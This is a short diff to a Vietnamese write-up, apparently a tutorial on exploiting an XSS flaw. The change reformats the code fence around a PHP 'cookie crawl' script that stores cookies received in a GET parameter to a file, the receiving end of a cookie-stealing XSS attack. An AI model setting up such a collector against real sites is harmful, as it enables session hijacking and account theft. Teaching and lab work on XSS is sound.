@@ -23,7 +23,8 @@ Vậy là đã chắc chắn web vulnerable với XSS, ta sẽ tiến hành khai
 
 Code php crawl cookie:
 
-'''php<?php
+```php
+<?php
     if(isset($_GET['cookie']))
     {
         $cookie = $_GET['cookie'];
@@ -36,6 +37,8 @@ Code php crawl cookie:
         // Đóng file lại
         fclose($f);
     }
-?>'''
+?>
+```
+
 
 
